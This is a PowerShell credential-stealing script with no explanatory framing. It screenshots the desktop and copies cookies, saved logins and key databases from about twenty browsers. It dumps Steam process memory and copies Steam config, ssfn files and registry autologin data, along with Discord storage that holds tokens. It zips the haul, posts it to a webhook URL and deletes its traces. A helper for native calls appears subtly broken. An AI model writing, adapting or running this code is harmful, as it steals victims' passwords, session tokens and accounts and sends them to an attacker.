$webhookUrl = ""

$tempFolder = "$env:TEMP\$(New-Guid)"

New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null



function Invoke-NativeMethod {

  param(

    [Parameter(Mandatory=$true)]

    [string]$DllName,

    [Parameter(Mandatory=$true)]

    [string]$FunctionName,

    [Parameter(Mandatory=$true)]

    [Type]$ReturnType,

    [Array]$Parameters,

    [Array]$ParameterTypes

  )

   

  $assembly = @"

using System;

using System.Runtime.InteropServices;

public class NativeMethods {

  [DllImport("$DllName", SetLastError = true)]

  public static extern $ReturnType $FunctionName($($Parameters -join ', '));

}

"@

  Add-Type -TypeDefinition $assembly -Language CSharp

  return [NativeMethods]::$FunctionName

}



function Get-ProcessMemoryDump {

  param($ProcessId, $OutputPath)

   

  try {

    $process = Get-Process -Id $ProcessId -ErrorAction Stop

    $miniDumpWriteDump = Invoke-NativeMethod -DllName "dbghelp.dll" -FunctionName "MiniDumpWriteDump" `

      -ReturnType ([bool]) -Parameters @("IntPtr", "uint", "IntPtr", "int", "IntPtr", "IntPtr", "IntPtr") `

      -ParameterTypes @([IntPtr], [uint], [IntPtr], [int], [IntPtr], [IntPtr], [IntPtr])

       

    $fileStream = New-Object IO.FileStream($OutputPath, [IO.FileMode]::Create)

    $result = $miniDumpWriteDump.Invoke($process.Handle, $process.Id, $fileStream.SafeFileHandle.DangerousGetHandle(), 

                      2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)

    $fileStream.Close()

    return $result

  } catch { return $false }

}



Add-Type -AssemblyName System.Windows.Forms, System.Drawing

$screen = [Windows.Forms.SystemInformation]::VirtualScreen

$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height

$graphics = [Drawing.Graphics]::FromImage($bitmap)

$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)

$bitmap.Save("$tempFolder\screenshot.png")

$graphics.Dispose()

$bitmap.Dispose()



Get-CompleteSystemInfo | ConvertTo-Json -Depth 10 | Out-File "$tempFolder\system_info.json"



$browserData = @(

  @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Firefox"; Path = "$env:APPDATA\Mozilla\Firefox\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },

  @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Opera GX"; Path = "$env:APPDATA\Opera Software\Opera GX Stable"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Vivaldi"; Path = "$env:LOCALAPPDATA\Vivaldi\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Yandex"; Path = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Chromium"; Path = "$env:LOCALAPPDATA\Chromium\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage", "Extension Rules", "Extension State") },

  @{ Name = "Waterfox"; Path = "$env:APPDATA\Waterfox\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },

  @{ Name = "Pale Moon"; Path = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"; Profiles = @("*"); Data = @("cookies.sqlite", "key4.db", "logins.json", "places.sqlite", "prefs.js", "formhistory.sqlite", "persdict.dat", "addons.json", "extensions.json", "cert9.db", "key4.db", "permissions.sqlite", "content-prefs.sqlite", "handlers.json", "storage.sqlite", "webappsstore.sqlite") },

  @{ Name = "SlimBrowser"; Path = "$env:LOCALAPPDATA\SlimBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Maxthon"; Path = "$env:APPDATA\Maxthon"; Profiles = @(""); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Comodo Dragon"; Path = "$env:LOCALAPPDATA\Comodo\Dragon\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Torch"; Path = "$env:LOCALAPPDATA\Torch\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "UC Browser"; Path = "$env:LOCALAPPDATA\UCBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Sogou Explorer"; Path = "$env:LOCALAPPDATA\SogouExplorer\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "QQ Browser"; Path = "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "CocCoc"; Path = "$env:LOCALAPPDATA\CocCoc\Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") },

  @{ Name = "Epic Privacy Browser"; Path = "$env:LOCALAPPDATA\Epic Privacy Browser\User Data"; Profiles = @("Default", "Profile *"); Data = @("Cookies", "Login Data", "Local State", "History", "Bookmarks", "Web Data", "Preferences", "Last Session", "Last Tabs", "Local Storage", "Session Storage") }

)



foreach ($browser in $browserData) {

  if (Test-Path $browser.Path) {

    foreach ($profilePattern in $browser.Profiles) {

      $profilePaths = if ($profilePattern -eq "") { @($browser.Path) } else { Get-ChildItem $browser.Path -Directory -Filter $profilePattern -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName }

       

      foreach ($profilePath in $profilePaths) {

        $browserName = $browser.Name

        $profileName = Split-Path $profilePath -Leaf

        $targetFolder = "$tempFolder\Browsers\$browserName\$profileName"

        New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null

         

        foreach ($dataItem in $browser.Data) {

          try {

            if ($browser.Name -like "*Firefox*" -or $browser.Name -like "*Waterfox*" -or $browser.Name -like "*Pale Moon*") {

              Get-ChildItem $profilePath -Filter $dataItem -ErrorAction SilentlyContinue | ForEach-Object {

                Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Force -ErrorAction SilentlyContinue

              }

            } else {

              Get-ChildItem $profilePath -Filter $dataItem -ErrorAction SilentlyContinue | ForEach-Object {

                if ($_.PSIsContainer) {

                  Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Recurse -Force -ErrorAction SilentlyContinue

                } else {

                  Copy-Item $_.FullName -Destination "$targetFolder\$($_.Name)" -Force -ErrorAction SilentlyContinue

                }

              }

            }

          } catch {}

        }

      }

    }

  }

}



$steamProcess = Get-Process -Name "steam*" -ErrorAction SilentlyContinue

if ($steamProcess) {

  $steamFolder = "$tempFolder\Steam"

  New-Item -ItemType Directory -Path $steamFolder -Force | Out-Null

   

  foreach ($process in $steamProcess) {

    $dumpPath = "$steamFolder\steam_memory_$($process.Id).dmp"

    Get-ProcessMemoryDump -ProcessId $process.Id -OutputPath $dumpPath

  }

}



$steamPaths = @(

  "$env:ProgramFiles (x86)\Steam",

  "$env:ProgramFiles\Steam",

  "${env:SystemDrive}\Steam",

  "${env:SystemDrive}\Program Files\Steam",

  "${env:SystemDrive}\Program Files (x86)\Steam"

)



foreach ($steamPath in $steamPaths) {

  if (Test-Path $steamPath) {

    $steamFolder = "$tempFolder\Steam"

    New-Item -ItemType Directory -Path $steamFolder -Force | Out-Null

     

    try {

      Copy-Item "$steamPath\config\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue

      Copy-Item "$steamPath\ssfn*" -Destination $steamFolder -Force -ErrorAction SilentlyContinue

      Copy-Item "$steamPath\userdata\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue

      Copy-Item "$steamPath\appcache\*" -Destination $steamFolder -Recurse -Force -ErrorAction SilentlyContinue

       

      $registryToken = (Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -Name "AutoLoginUser" -ErrorAction SilentlyContinue).AutoLoginUser

      if ($registryToken) {

        $registryToken | Out-File -FilePath "$steamFolder\steam_autologin.txt"

      }

       

      $registryConfig = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue

      if ($registryConfig) {

        $registryConfig | ConvertTo-Json | Out-File -FilePath "$steamFolder\steam_registry.json"

      }

    } catch {}

  }

}



$discordPaths = @(

  "$env:APPDATA\Discord",

  "$env:LOCALAPPDATA\Discord",

  "$env:APPDATA\discordcanary",

  "$env:LOCALAPPDATA\discordcanary",

  "$env:APPDATA\discordptb",

  "$env:LOCALAPPDATA\discordptb"

)



foreach ($discordPath in $discordPaths) {

  if (Test-Path $discordPath) {

    $discordFolder = "$tempFolder\Discord"

    New-Item -ItemType Directory -Path $discordFolder -Force | Out-Null

     

    try {

      Copy-Item "$discordPath\Local Storage\*" -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue

      Copy-Item "$discordPath\Session Storage\*" -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue

      Copy-Item "$discordPath\Local State" -Destination $discordFolder -Force -ErrorAction SilentlyContinue

    } catch {}

  }

}



$zipPath = "$env:TEMP\$(New-Guid).zip"

while (Test-Path $zipPath) {

  $zipPath = "$env:TEMP\$(New-Guid).zip"

}



Add-Type -AssemblyName System.IO.Compression.FileSystem

[IO.Compression.ZipFile]::CreateFromDirectory($tempFolder, $zipPath, [IO.Compression.CompressionLevel]::Optimal, $false)



$boundary = [System.Guid]::NewGuid().ToString()

$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)

$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")



$body = New-Object System.Text.StringBuilder

$body.AppendLine("--$boundary") | Out-Null

$body.AppendLine("Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $zipPath -Leaf)`"") | Out-Null

$body.AppendLine("Content-Type: application/zip") | Out-Null

$body.AppendLine() | Out-Null

$body.AppendLine($enc.GetString($fileBytes)) | Out-Null

$body.AppendLine("--$boundary--") | Out-Null



try {

  Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body.ToString() -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" | Out-Null

} catch {}



Start-Sleep -Seconds 2

Remove-Item $tempFolder -Recurse -Force -ErrorAction SilentlyContinue

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
